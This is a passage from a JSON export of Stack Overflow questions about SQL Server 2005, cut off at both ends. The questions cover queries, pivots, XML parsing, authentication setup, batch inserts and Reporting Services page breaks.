it?</p>\n"},{"tags":["sql","database","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":44,"score":3,"question_id":12552768,"title":"How can I select a value from a table twice with different values","body":"<p>I have Message table in which \"senderid\" and \"receiverid\"exists. \nI have User table in which username of each user is found. </p>\n\n<p>Now I want to make a stored procedure in which I select the username where userid=senderid and username in which userid=receivername. </p>\n\n<p>I tried this but it's wrong, coz I never made something like this before. </p>\n\n<pre><code>SELECT       SystemUser.SU_Username Where SystemUser.SU_ID=MessageReciever As RecieverName, SystemUser.SU_Username where Message.SenderID = SystemUser.SU_ID As SenderName FROM            Message CROSS JOIN\n                     SystemUser\n</code></pre>\n\n<p>Is there a method to do what I want?</p>\n"},{"tags":["sql","sql-server-2005","aggregate-functions"],"answer_count":5,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":6076,"score":9,"question_id":6841605,"title":"SQL Server: Get Top 1 of Each Group","body":"<p>I have a table which I want to get the latest entry for each group. Here's the table:</p>\n\n<p><code>DocumentStatusLogs</code> Table</p>\n\n<pre><code>|ID| DocumentID | Status | DateCreated |\n| 2| 1          | S1     | 7/29/2011   |\n| 3| 1          | S2     | 7/30/2011   |\n| 6| 1          | S1     | 8/02/2011   |\n| 1| 2          | S1     | 7/28/2011   |\n| 4| 2          | S2     | 7/30/2011   |\n| 5| 2          | S3     | 8/01/2011   |\n| 6| 3          | S1     | 8/02/2011   |\n</code></pre>\n\n<p>The table will be grouped by DocumentID and sorted by DateCreated in descending order. For each DocumentID, I want to get the latest status. </p>\n\n<p>My preferred output:</p>\n\n<pre><code>| DocumentID | Status | DateCreated |\n| 1          | S1     | 8/02/2011   |\n| 2          | S3     | 8/01/2011   |\n| 3          | S1     | 8/02/2011   |\n</code></pre>\n\n<ul>\n<li><p>Is there any aggregate function to get only the top from each group? See pseudo-code <code>GetOnlyTheTop</code> below:</p>\n\n<p><code>select DocumentID, GetOnlyTheTop(Status), GetOnlyTheTop(DateCreated)\nfrom DocumentStatusLogs\ngroup by DocumentID\norder by DateCreated desc</code></p></li>\n<li><p>If such function doesn't exist, is there any way I can achieve the output I want?</p></li>\n<li>Or at the first place, could this be caused by unnormalized database? I'm thinking, since what I'm looking for is just one row, should that <code>status</code> also be located in the parent table?</li>\n</ul>\n\n<p>Please see the parent table for more information:</p>\n\n<p>Current <code>Documents</code> Table</p>\n\n<pre><code>| DocumentID | Title  | Content  | DateCreated |\n| 1          | TitleA | ...      | ...         |\n| 2          | TitleB | ...      | ...         |\n| 3          | TitleC | ...      | ...         |\n</code></pre>\n\n<p>Should the parent table be like this so that I can easily access it's status?</p>\n\n<pre><code>| DocumentID | Title  | Content  | DateCreated | CurrentStatus |\n| 1          | TitleA | ...      | ...         | s1            |\n| 2          | TitleB | ...      | ...         | s3            |\n| 3          | TitleC | ...      | ...         | s1            |\n</code></pre>\n\n<p>Thanks in advance!</p>\n\n<p><strong>UPDATE</strong>\nI just learned how to use \"apply\" which makes it easier to address such problems.</p>\n"},{"tags":["sql-server-2005","spring-security","md5","password-encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12508947,"title":"Hashbytes SQL Server 2005 and authentication of Spring Security","body":"<p>I've a webapp with JSF-Spring-Mybatis and Spring Security 3.1 that connects to SQL server's database. </p>\n\n<p>I've problems with Spring Security's authentication. The field \"password\" of my table users has your data encrypted with the SQL Server's function HasyBytes.</p>\n\n<p>In other words...When inserting data did the following:</p>\n\n<pre><code>insert into users(password) values (Hasybytes('MD5', 'any text')) \n</code></pre>\n\n<p>Using MD5 thought that I could use this class Md5PasswordEncoder (as mentioned here  <a href=\"http://www.packtpub.com/article/spring-security-configuring-secure-passwords\" rel=\"nofollow\">http://www.packtpub.com/article/spring-security-configuring-secure-passwords</a>) so that my users can to authenticate. But, this does not happen...I get the following message: </p>\n\n<pre><code>Authentication failed: password does not match stored value \n</code></pre>\n\n<p>In which I can be failing?</p>\n"},{"tags":["sql","sql-server-2005","synchronization","merge","recursive-query"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":318,"score":0,"question_id":4951844,"title":"Need to synchronize a table with a query (view) in the same Sql Server Database","body":"<p>I need to keep a table in sync with a recursive CTE query that joins to multiple tables.  The CTE may return different results every time it's ran (if any changes were made to the tables it joins on).  The CTE is slow and I can't afford to have a trigger run it since the query that caused the trigger to fire won't return until after the trigger has fired (I don't want a simple update to a single record to take 15 seconds because it's waiting on the trigger to finish).  Any details on how to implement the solution in SSMS would be nice too, but not necessary.</p>\n\n<p>One solution would be to have a scheduled job run the CTE, and merge it's results with the table.  The scheduled job can run every few seconds so the table  is as up-to-date as possible.  But I don't know how to create a scheduled job in Sql Server 2005 or how to Merge the results of a CTE query with a table.</p>\n\n<p>To restate my question:</p>\n\n<p><em>How do I keep the table up to date as close to real-time as possible using the CTE?</em></p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12543526,"title":"Select Single column value in multiple column?","body":"<p>I have some data in my table as follows:</p>\n\n<pre><code> ID     Name\n  2    219SUN_BV_Secure_Gateway.pdf\n  3    197FDD_BV_Secure_Gateway.pdf\n  5    225RQB_BV_Secure_Gateway.pdf\n  6    A_00025_Q1_2012.pdf         \n  7    A_00025_Q2_2012.pdf         \n  8    A_00025_Q3_2011.pdf         \n  9    C_00025_Q3_2011_PostLLC.pdf\n 10    B_00025_Q3_2011.pdf        \n</code></pre>\n\n<p>I want to fetch the data as per the following requirement:</p>\n\n<ul>\n<li>in first column, I want data whose name starts with A</li>\n<li>in Second column, I want data whose name starts with B</li>\n<li>in Third column, I want data whose name starts with C</li>\n</ul>\n\n<p>I used this query:</p>\n\n<pre><code>SELECT \n    CASE \n        WHEN DocumentFile LIKE 'A%' THEN DocumentFile \n    END as DocFile_A,\n    CASE\n        WHEN DocumentFile LIKE 'B%' THEN DocumentFile \n    END as DocFile_B,\n    CASE \n        WHEN DocumentFile LIKE 'C%' THEN DocumentFile \n    END as DocFile_C \nFROM \n    RFP_DocumentVault \n</code></pre>\n\n<p>This returns me the following results:</p>\n\n<pre><code>DocFile_A              DocFile_B          DocFile_C\n NULL          NULL             NULL\n NULL          NULL             NULL\n NULL          NULL             NULL\n A_00025_Q1_2012.pdf   NULL             NULL\n A_00025_Q2_2012.pdf   NULL             NULL\n A_00025_Q3_2011.pdf   NULL             NULL\n NULL          NULL           C_00025_Q3_2011_Post Partners II, LLC.pdf\n NULL          B_00025_Q3_2011.pdf        NULL\n</code></pre>\n\n<p>But I want results as follows:</p>\n\n<pre><code> DocFile_A            DocFile_B                 DocFile_C\n A_00025_Q1_2012.pdf  B_00025_Q3_2011.pdf     C_00025_Q3_2011_Post Partners II, LLC.pdf\n A_00025_Q2_2012.pdf  NULL                      NULL\n A_00025_Q3_2011.pdf  NULL                      NULL\n</code></pre>\n\n<p>Any idea how I can do this?</p>\n"},{"tags":["sql-server","asp.net-mvc","asp.net-mvc-3","sql-server-2005","appharbor"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12543256,"title":"How to connect to SQL Server provided by AppHarbour","body":"<p>I am new to AppHarbour and I am trying to deploy an ASP.NET MVC 3 Web application here. I have successfully deployed the web application. </p>\n\n<p>Now I want to run some sql scripts on the database provided.</p>\n\n<p>For which I have followed the following steps...</p>\n\n<p><strong>Step 1 :</strong>\n<img src=\"http://i.stack.imgur.com/WDs5G.png\" alt=\"enter image description here\">\n<strong>Step 2 :</strong>\n<img src=\"http://i.stack.imgur.com/S2LoA.png\" alt=\"enter image description here\">\n<strong>Step 3 :</strong>\n<img src=\"http://i.stack.imgur.com/aSG27.png\" alt=\"enter image description here\"></p>\n\n<p>Now here I get the server name, username and password as well as the database name, but !</p>\n\n<p>When I try connecting to this database using <code>SQL Server Management Studio</code> I just cannot connect to it.</p>\n\n<p>I always get the following error message</p>\n\n<blockquote>\n  <blockquote>\n    <p>TITLE: Connect to Server\n    Cannot connect to e2f7c78d*<strong><em>*</em></strong>*b9.sqlserver.sequelizer.com.</p>\n    \n    <p>ADDITIONAL INFORMATION:\n    This version of Microsoft SQL Server Management Studio can only be used to connect to SQL Server 2000 and SQL Server 2005 servers. (ConnectionDlg)</p>\n  </blockquote>\n</blockquote>\n\n<p>Please can some one help me on this. Thanks</p>\n"},{"tags":["sql-server-2005","tsql","xml-namespaces"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2866,"score":3,"question_id":5467387,"title":"Ignore XML namespace in T-SQL","body":"<p>How do I remove/ignore the XML namespace in an xml file when querying the data with T-SQL?</p>\n\n<p>Im loading an xml file into a variable, and it works just fine. But the xml has a namespace set, and unless I remove it, my queries come up empty.</p>\n\n<p>T-SQL:</p>\n\n<pre><code>DECLARE @xml xml\nSELECT @xml = BulkColumn FROM OPENROWSET(BULK 'C:\\myfile.xml', SINGLE_BLOB) AS A\n\nSELECT X.z.value('ID[1]', 'VARCHAR(3)') FROM @xml.nodes('myroot/element') AS X(z)\n</code></pre>\n\n<p>XML sample:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;myroot xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n  &lt;element&gt;\n    &lt;ID&gt;1&lt;/ID&gt;\n  &lt;/element&gt;\n  &lt;element&gt;\n    &lt;ID&gt;2&lt;/ID&gt;\n  &lt;/element&gt;\n  &lt;element&gt;\n    &lt;ID&gt;3&lt;/ID&gt;\n  &lt;/element&gt;\n&lt;/myroot&gt;\n</code></pre>\n\n<p>This works, the query returns this:</p>\n\n<blockquote>\n  <p>1<br>\n  2<br>\n  3  </p>\n</blockquote>\n\n<p>But the XML also contains a default namespace:</p>\n\n<pre><code>&lt;myroot xmlns=\"http://XXX\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n</code></pre>\n\n<p>The <code>xmlns=\"http://XXX\"</code> completely screws up my query. And unfortunately manually modifying the xml before loading it is not really an option.</p>\n\n<p><strong>Questions:</strong>  </p>\n\n<ul>\n<li>How do I remove or ignore the namespace when I load the data into the variable? </li>\n<li>Or how do I modify my query to handle the namespace?</li>\n</ul>\n"},{"tags":["sql-server","sql-server-2005","cross-domain","windows-authentication"],"answer_count":1,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":4785,"score":10,"question_id":5890174,"title":"Cross Domain SQL Server Logins Using Windows Authentication","body":"<p>I have a SQL Server 2005 named instance using Windows Authentication with domain groups serving as logins. The domain structures are as follows:</p>\n\n<pre><code>      Forest1                Forest2\n      /      \\                  |\nDomain1       Domain2        Domain3\n</code></pre>\n\n<p>Objects are organized in the following domains:</p>\n\n<p><strong>Forest1.Domain1</strong></p>\n\n<ul>\n<li>Users</li>\n<li>Global Groups</li>\n</ul>\n\n<p><strong>Forest1.Domain2</strong></p>\n\n<ul>\n<li>SQL Server Instance</li>\n<li>Domain Local Groups (serving as Logins)</li>\n</ul>\n\n<p><strong>Forest2.Domain3</strong></p>\n\n<ul>\n<li>Users</li>\n<li>Global Groups</li>\n</ul>\n\n<p>All my users exist in <code>Domain1</code> and <code>Domain3</code> but the SQL Server box exists in <code>Domain2</code>. As such, my logins are  domain groups in <code>Domain2</code>. When a user in <code>Domain1</code> is added to a domain local group in <code>Domain2</code> and attempts to connect using TCP/IP protocol to the SQL Server instance, he receives the following error message:</p>\n\n<blockquote>\n  <p>Cannot connect to &lt;instance&gt;. Login failed for user 'Domain1\\userName'. (Microsoft SQL Server, Error: 18456)</p>\n</blockquote>\n\n<p>Other things I've tried:</p>\n\n<ul>\n<li><p>If I add the user as a login\nexplicitly, he can connect.</p></li>\n<li><p>If I add a <code>Domain1</code> global group of\nwhich the user is a member as a login\nexplicitly, he can connect.</p></li>\n<li><p>If I add a <code>Domain1</code> global group of\nwhich the user is a member as a\nmember of the <code>Domain2</code> domain local\ngroup used as a login, he cannot\nconnect.</p></li>\n<li><p><strong>EDIT:</strong> If I add the <code>Domain2</code> domain local group to the Demote Desktop Users group on the <code>Domain2</code> server hosting the SQL Server instance, the <code>Domain1</code> user can successfully connect to the server - I can also connect to the instance locally as the <code>Domain1</code> user (just not remotely).</p></li>\n<li><p><strong>EDIT:</strong> If I add the <code>Domain2</code> domain local group to a local server group and create a SQL Server login for that local server group, the <code>Domain1</code> user still cannot connect to the instance remotely.</p></li>\n<li><p><strong>EDIT:</strong> If I change the connection network protocol to \"Named Pipes\", the <code>Domain1</code> user can successfully connect remotely.</p></li>\n</ul>\n\n<hr>\n\n<p>From what I understand (referencing these TechNet articles: <a href=\"http://technet.microsoft.com/en-us/library/cc755692%28WS.10%29.aspx\" rel=\"nofollow\">Group Scope</a> and <a href=\"http://technet.microsoft.com/en-us/library/cc776499%28WS.10%29.aspx\" rel=\"nofollow\">Nesting Groups</a>), the domain group MUST be a domain local group in order to include users from both <code>Domain1</code> and <code>Domain3</code>.</p>\n\n<p>How can I use a domain group as a SQL Server login using Windows authentication such that the domain group can contain users from both <code>Domain1</code> and <code>Domain3</code> and users can connect remotely via TCP/IP?</p>\n\n<p><strong>MORE NOTES</strong></p>\n\n<ul>\n<li>The service account for the SQL Server named instance is a user account in <code>Domain1</code></li>\n<li>SPN's have been added for the service account (including server name and alias names)</li>\n</ul>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Changing the SQL Service instance service account to be in <code>Domain2</code> seems to have resolved the issue. I'll investigate further and post back my findings!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":8747,"score":2,"question_id":5015279,"title":"How to get the Sum of all column values in the last row of a resultset?","body":"<p>I need to get the sum of all column values of a resultset in the last row. \nHere is my SQL query.</p>\n\n<pre><code>select Master_Code, SUM(Jan), SUM(Feb), SUM(Mar)\nfrom dbo.foobar\nWHERE Participating_City = 'foofoo'\nGROUP BY Master_Code ORDER BY Master_Code ASC\n</code></pre>\n\n<p>something like this:</p>\n\n<pre><code>    Master_Code Jan Feb Mar \n    1            4   5   6\n    2            5   5   5\n    Total        9  10  11\n</code></pre>\n"},{"tags":["sql-server-2005","csv","import"],"answer_count":3,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":14001,"score":4,"question_id":2562763,"title":"Importing csv file to SQL Server Management Studio - No tables available","body":"<p>I am trying to import a csv file to insert data into an existing table on my database. I go through the wizard and when it comes to select source tables and views for the destination, there are none to choose from. It just thinks I am trying to create a new table.</p>\n\n<p>Any suggestions? Thanks!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":9243,"score":2,"question_id":1477539,"title":"How to unlock user account in SQL Server 2005 Management Studio?","body":"<p>One of user name tried login many times and failed. Sql server 2005 locked account automatically. How can I unlock user account in SQL Server 2005 Management Studio?</p>\n"},{"tags":["c#","sql-server-2005","ado.net","multiple-insert"],"answer_count":6,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3020,"score":2,"question_id":2972974,"title":"How should I multiple insert multiple records?","body":"<p>I have a class named <code>Entry</code> declared like this:  </p>\n\n<pre><code>class Entry{\n    string Id {get;set;}\n    string Name {get;set;}\n}  \n</code></pre>\n\n<p>and then a method that will accept multiple such <code>Entry</code> objects for insertion into the database using ADO.NET:  </p>\n\n<pre><code>static void InsertEntries(IEnumerable&lt;Entry&gt; entries){\n    //build a SqlCommand object\n    using(SqlCommand cmd = new SqlCommand()){\n        ...\n        const string refcmdText = \"INSERT INTO Entries (id, name) VALUES (@id{0},@name{0});\";\n        int count = 0;\n        string query = string.Empty;\n        //build a large query\n        foreach(var entry in entries){\n            query += string.Format(refcmdText, count);\n            cmd.Parameters.AddWithValue(string.Format(\"@id{0}\",count), entry.Id);\n            cmd.Parameters.AddWithValue(string.Format(\"@name{0}\",count), entry.Name);\n            count++;\n        }\n        cmd.CommandText=query;\n        //and then execute the command\n        ...\n    }\n}  \n</code></pre>\n\n<p>And my question is this: should I keep using the above way of sending multiple insert statements (build a giant string of insert statements and their parameters and send it over the network), or should I keep an open connection and send a single insert statement for each <code>Entry</code> like this:  </p>\n\n<pre><code>using(SqlCommand cmd = new SqlCommand(){\n    using(SqlConnection conn = new SqlConnection(){\n        //assign connection string and open connection\n        ...\n        cmd.Connection = conn;\n        foreach(var entry in entries){\n            cmd.CommandText= \"INSERT INTO Entries (id, name) VALUES (@id,@name);\";\n            cmd.Parameters.AddWithValue(\"@id\", entry.Id);\n            cmd.Parameters.AddWithValue(\"@name\", entry.Name);\n            cmd.ExecuteNonQuery();\n        }\n    }\n }  \n</code></pre>\n\n<p>What do you think? Will there be a performance difference in the Sql Server between the two? Are there any other consequences I should be aware of?</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":100,"score":2,"question_id":12536097,"title":"How to convert military hours to mm/dd/yyyy and time in SQL sever?","body":"<p>I have a simple data set shown in Table 1 below. I would like to produce two new columns (<code>START_SHIFT_DT_TIME</code> and <code>END_SHIFT_DT_TIME</code>) using the columns from Table 1. The desired output is shown in Table 2. </p>\n\n<p>The requirements are:</p>\n\n<ol>\n<li>If the <code>START_SHIFT</code> hours starts on or after 22:00:00 then the actual start date is the previous day.</li>\n<li>If the <code>START_SHIFT</code> hours starts before  22:00:00 then the actual start date is the following day.</li>\n</ol>\n\n<p>Could someone please take a look. Note, I am using SQL server. Thanks a lot!!!</p>\n\n<p><strong>Table 1</strong>:</p>\n\n<pre><code>START_SHIFT END_SHIFT       DATE    \n22:00:00    06:00:00        1/13/2012 12:00:00 AM\n07:00:00    15:00:00        1/13/2012 12:00:00 AM\n23:30:00    07:30:00        2/27/2012 12:00:00 AM\n00:00:00    08:00:00        2/17/2012 12:00:00 AM\n17:00:00    01:00:00        1/1/2012 12:00:00 AM\n</code></pre>\n\n<p><strong>Table 2</strong>:</p>\n\n<pre><code>START_SHIFT END_SHIFT     DATE                  START_SHIFT_DT_TIME     END_SHIFT_DT_TIME\n22:00:00    06:00:00      1/13/2012 12:00:00 AM  1/12/2012 10:00:00 PM  1/13/2012 6:00:00 AM\n07:00:00    15:00:00      1/13/2012 12:00:00 AM  1/13/2012 7:00:00 AM   1/13/2012 3:00:00 PM\n23:30:00    07:30:00      2/27/2012 12:00:00 AM  2/26/2012 11:30:00 PM  2/27/2012 7:30:00 AM\n00:00:00    08:00:00      2/17/2012 12:00:00 AM  2/17/2012 12:00:00 AM  2/17/2012 8:00:00 AM\n17:00:00    01:00:00      1/1/2012 12:00:00 AM   1/1/2012 5:00:00 PM    1/2/2012 1:00:00 AM\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","cakephp"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":780,"score":4,"question_id":2334918,"title":"CakePHP model useTable with SQL Views","body":"<p>I'm in the process converting our CakePHP-built website from Pervasive to SQL Server 2005.  After a lot of hassle the setup I've gotten to work is using the ADODB driver with 'connect' as odbc_mssql. This connects to our database and builds the SQL queries just fine.  </p>\n\n<p>However, here's the rub: one of our Models was associated with an SQL view in Pervasive.  I ported over the view, but it appears using the set up that I have that CakePHP can't find the View in SQL Server.</p>\n\n<p>Couldn't find much after some Google searches - has anyone else run into a problem like this?  Is there a solution/workaround, or is there some redesign in my future?</p>\n"},{"tags":["c#","sql","sql-server-2005","transactions","vsts2008"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":300,"score":2,"question_id":3084195,"title":"Can a transaction be rolled back after it's committed and connection is closed?","body":"<p>Can a transaction be rolled back after it's committed and connection is closed?</p>\n\n<pre><code>    finally\n    {\n        // Commit the transaction.\n        sqlTran.Commit();\n\n        reader.Close();\n        reader.Dispose();\n\n        conn.Close();\n        conn.Dispose();\n    }\n</code></pre>\n\n<p>I would like to give the user an option of <em>Opps! roll it back</em>. So if it's commited can it be rolled back?</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":2331904,"title":"Generate calendar ","body":"<p>How can I generate the dates for the entire range? \nThanks</p>\n"},{"tags":["sql","sql-server-2005","stored-procedures","recovery","data-recovery"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":967,"score":1,"question_id":6739949,"title":"undo changes to a stored procedure","body":"<p>I altered a stored procedure and unknowingly overwrote some changes that were made to it by another developer. Is there a way to undo the changes and get the old script back?</p>\n\n<p>Unfortunately I do not have a backup of that database, so that option is ruled out. </p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot","unpivot"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":12531522,"title":"Using Dynamic Pivot/Unpivot to display correctly","body":"<p>I believe I will have to use both a Pivot and a UnPivot to get the data that I want.</p>\n\n<p>My current data looks like this:</p>\n\n<pre><code>var_date    var_attribute   var_out_of_ad   var_per_ad\n9/4/2012    Aux1            0               0\n9/5/2012    Aux1            0               0\n9/4/2012    Aux2            1680            0.733333333\n9/5/2012    Aux2            1680            0.733333333\n9/4/2012    Aux3            1500            0.791666667\n9/5/2012    Aux3            1500            0.791666667\n9/4/2012    Aux4            0               0\n9/5/2012    Aux4            0               0\n9/4/2012    Aux5            0               0\n9/5/2012    Aux5            0               0\n9/4/2012    Aux6            26640           0.766929134\n9/5/2012    Aux6            26640           0.766929134\n9/4/2012    Aux7            28800           0\n9/5/2012    Aux7            28800           0\n9/4/2012    Aux8            3600            0\n9/5/2012    Aux8            3600            0\n</code></pre>\n\n<p>I want to be able to break apart by Aux Code (which will by dynamic) the columns <code>var_out_of_ad</code> and <code>var_per_ad</code> so I would like my data to look like this:</p>\n\n<pre><code>var_date  Aux1_per   Aux1_out   Aux2_per   Aux2_out ...\n9/4/2012  0          0           .733      1680\n9/5/2012  0          0           .733      1680\n</code></pre>\n\n<p>I have put the testing data into a sql fiddle: <a href=\"http://sqlfiddle.com/#!3/7f06d/1\" rel=\"nofollow\">http://sqlfiddle.com/#!3/7f06d/1</a> as well as all of the work I have done with the dynamic pivot.</p>\n\n<p>Can someone please guide me as to what to do next? I am lost.</p>\n\n<p>Thank You</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":117,"score":2,"question_id":12524537,"title":"Convert UTC Milliseconds to DATETIME in SQL server","body":"<p>I have an requirement to convert UTC milliseconds to DateTime in SQL server.</p>\n\n<p>This we can easily do it in the C# by following code.</p>\n\n<pre><code>DateTime startDate = new DateTime(1970, 1, 1).AddMilliseconds(1348203320000);\n</code></pre>\n\n<p>I need to do this in SQL server. I found some script here <a href=\"http://extendeddotnet.blogspot.in/2011/10/convert-net-datetimeticks-to-t-sql.html\" rel=\"nofollow\">http://extendeddotnet.blogspot.in/2011/10/convert-net-datetimeticks-to-t-sql.html</a>. But this was taking initial ticks are from 1900-01-01. </p>\n\n<p>I have used DATEADD function as below, but this was giving Arithmetic overflow exception by supping milliseconds as difference.</p>\n\n<pre><code>SELECT DATEADD(MILLISECOND,1348203320000,'1970-1-1')\n</code></pre>\n\n<p>Please Help me in this regard. Thanks in Advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12530317,"title":"Case Statement Set Parameter","body":"<pre><code>SELECT (CASE\n        WHEN(percentage &gt;= @Start AND percentage &lt; @End)                        \n        THEN \n            SET @body ='&lt;html&gt;&lt;body&gt;&lt;H3&gt;Report&lt;/H3&gt;\n                        &lt;table border = 1&gt; \n                        &lt;tr&gt;\n                        &lt;th&gt;No &lt;/th&gt; &lt;th&gt; date &lt;/th&gt; &lt;th&gt; lag &lt;/th&gt; &lt;th&gt; Variance &lt;/th&gt;&lt;/tr&gt;'    \n            SET @body = @body + @xml +'&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;' \n        ELSE 'NULL' END) as Variance  \n    FROM TestTbl\n</code></pre>\n\n<p>Msg 156, Level 15, State 1, Procedure SP_CheckDB, Line 31\nIncorrect syntax near the keyword 'SET'.\nMsg 156, Level 15, State 1, Procedure SP_CheckDB, Line 36\nIncorrect syntax near the keyword 'ELSE'</p>\n\n<p>Kindly help with this statement</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":8,"favorite_count":0,"up_vote_count":12,"down_vote_count":0,"view_count":15806,"score":12,"question_id":8439,"title":"Conditional Visibility and Page Breaks with SQL Server 2005 Reporting Services","body":"<p>I know there's a bug with conditional visibility and page breaks with SQL 2005, but I wonder if anyone has come up with a work around.</p>\n\n<p>I have a table that has a conditional visibility expression, and I need a page break at the end of the table.</p>\n\n<ul>\n<li>If I set the PageBreakAtEnd property to true. It is ignored no matter what. Remove the visibility condition and it works.</li>\n<li>If I place the table inside a rectangle with the conditional visibility on the table, and the page break on the table. Same result. The page break property is ignored.</li>\n<li>If I set the rectangle with the PageBreakAtEnd property and the table with the visibility condition, then I still get a page break even when the table isn't shown.</li>\n</ul>\n\n<p>Any other ideas on what to try? I'm almost at the point where I need a separate report rather than conditional visibility :(</p>\n\n<p><strong>Edit: @Josh:</strong> That has the same problems. If the second table has conditional visibility it doesn't work. If it doesn't have the visibility expression, then I get the page break all the time.</p>\n\n<p>@<strong>Erick:</strong> I really wanted that to be the answer but unfortunately it doesn't work. When the visibility expression evaluates to hidden, there's a big gap where the rectangles would be (which I can live with), and when it evaluates to visible, the page breaks still don't work. </p>\n"},{"tags":["xml","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":980,"score":7,"question_id":3026748,"title":"Difference between SQL 2005 and SQL 2008 for inserting multiple rows with XML","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3978807/why-insert-select-to-variable-table-from-xml-variable-so-slow\">Why insert-select to variable table from XML variable so slow?</a>  </p>\n</blockquote>\n\n\n\n<p>I am using the following SQL code for inserting multiple rows of data in a table. The data is passed to the stored procedure using an XML variable :</p>\n\n<pre><code>INSERT INTO MyTable\n   SELECT SampleTime = T.Item.value('SampleTime[1]', 'datetime'),\n          Volume1 = T.Item.value('Volume1[1]', 'float'),\n          Volume2 = T.Item.value('Volume2[1]', 'float')\n   FROM @xml.nodes('//Root/MyRecord') T(item)\n</code></pre>\n\n<p>I have a whole bunch of unit tests to verify that I am inserting the right information, the right number of records, etc.. when I call the stored procedure. </p>\n\n<p>All fine and dandy - that is, until we began to monkey around with the compatibility level of the database.</p>\n\n<p>The code above worked beautifully as long as we kept the compatibility level of the DB at 90 (SQL 2005).\nWhen we set the compatibility level at 100 (SQL 2008), the unit tests failed, because the stored procedure using the code above times out.</p>\n\n<p>The unit tests are dropping the database, re-creating it from scripts, and running the tests on the brand new DB, so it's not - I think - a question of the 'old compatibility level' sticking around.</p>\n\n<p>Using the SQL Management studio, I made up a quick test SQL script. Using the same XML chunk, I alter the DB compat level , truncate the table, then use the code above to insert 650 rows. When the level is 90 (SQL 2005), it runs in milliseconds. When the level is 100 (SQL 2008) it sometimes takes over a minute, sometimes runs in milliseconds.</p>\n\n<p>I'd appreciate any insight anyone might have into that.</p>\n\n<hr>\n\n<h2>EDIT</h2>\n\n<p>The script takes over a minute to run with my actual data, which has more rows than I show here, is a real table, and has an index.\nWith the following example code, the difference goes between milliseconds and around 5 seconds.</p>\n\n<pre><code>--use [master]\n--ALTER DATABASE MyDB SET compatibility_level =100\n\nuse [MyDB]\n\ndeclare @xml xml\n\nset @xml = '&lt;?xml version=\"1.0\"?&gt;\n&lt;Root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n  &lt;Record&gt;\n    &lt;SampleTime&gt;2009-01-24T00:00:00&lt;/SampleTime&gt;\n    &lt;Volume1&gt;0&lt;/Volume1&gt;\n    &lt;Volume2&gt;0&lt;/Volume2&gt;\n  &lt;/Record&gt;\n..... 653 records, sample time spaced out 4 hours ........\n&lt;/Root&gt;'\n\nDECLARE @myTable TABLE(\nID int IDENTITY(1,1) NOT NULL,\n    [SampleTime] [datetime] NOT NULL,\n    [Volume1] [float] NULL,\n    [Volume2] [float] NULL)\n\nINSERT INTO @myTable\n    select \n        T.Item.value('SampleTime[1]', 'datetime') as SampleTime,\n            Volume1 = T.Item.value('Volume1[1]', 'float'),\n            Volume2 = T.Item.value('Volume2[1]', 'float')\n    FROM @xml.nodes('//Root/Record') T(item)\n</code></pre>\n\n<p>I uncomment the 2 lines at the top, select them and run just that (the ALTER DATABASE statement), then comment the 2 lines, deselect any text and run the whole thing.</p>\n\n<p>When I change from 90 to 100, it runs all the time in 5 seconds (I change the level once, but I run the series several times to see if I have consistent results).\nWhen I change from 100 to 90, it runs in milliseconds all the time.\nJust so you can play with it too.\nI am using SQL Server 2008 R2 standard edition.</p>\n"},{"tags":["sql","tsql","sql-server-2005","try-catch","raiserror"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12485234,"title":"RAISERROR from Catch Block in TSQL Passed to Calling 